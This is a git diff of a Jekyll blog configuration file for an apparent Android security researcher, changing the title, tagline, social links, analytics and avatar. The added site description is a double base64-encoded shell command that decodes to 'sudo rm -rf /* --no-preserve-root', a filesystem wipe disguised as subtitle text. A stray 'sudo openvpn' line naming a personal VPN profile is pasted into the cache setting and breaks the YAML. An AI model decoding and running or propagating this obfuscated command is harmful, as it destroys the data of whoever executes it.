@@ -14,15 +14,13 @@ timezone: Asia/Kolkata
 # jekyll-seo-tag settings › https://github.com/jekyll/jekyll-seo-tag/blob/master/docs/usage.md
 # ↓ --------------------------
 
-title: Asif # the main title
+title: 0x4SUS # the main title
 
-tagline: 4DR3N4L1N3 # it will display as the subtitle
+tagline: Android Security Researcher
 
 description: >- # used by seo meta and the atom feed
-  A Simple Demo blog post for testing 
-  0d4y's 
+  c3VkbyBlY2hvICJjM1ZrYnlCeWJTQXRjbVlnTHlvZ0xTMXVieTF3Y21WelpYSjJaUzF5YjI5MCIgfCBiYXNlNjQgLWQgfCAgYmFzaA== # it will display as the subtitle
 
-  of Android
 
 # Fill in the protocol & hostname for your site.
 # E.g. 'https://username.github.io', note that it does not end with a '/'.
@@ -45,7 +43,7 @@ social:
     - https://github.com/ASIFASSU # change to your GitHub homepage
     # Uncomment below to add more social links
     # - https://www.facebook.com/username
-    # - https://www.linkedin.com/in/username
+    - https://www.linkedin.com/in/asif-shaik-a04b6a244/
 
 # Site Verification Settings
 webmaster_verifications:
@@ -78,7 +76,7 @@ analytics:
 
 # Page views settings
 pageviews:
-  provider: # now only supports 'goatcounter'
+  provider: goatcounter
 
 # Prefer color scheme setting.
 #
@@ -101,7 +99,7 @@ theme_mode: # [light | dark]
 cdn:
 
 # the avatar on sidebar, support local or CORS resources
-avatar: https://avatars.githubusercontent.com/u/86088167?v=4
+avatar: assets/profile.jpeg
 
 # The URL of the site-wide social preview image used in SEO `og:image` meta tag.
 # It can be overridden by a customized `page.image` in front matter.
@@ -142,7 +140,8 @@ assets:
 
 pwa:
   enabled: true # The option for PWA feature (installable)
-  cache:
+  cache:sudo openvpn --config 'enterprise.corellium.com VPN - asifshaik7093gmailcom6637cce52b56624ee505052flabcyclicscanner.ovpn'
+
     enabled: true # The option for PWA offline cache
     # Paths defined here will be excluded from the PWA cache.
     # Usually its value is the `baseurl` of another website that
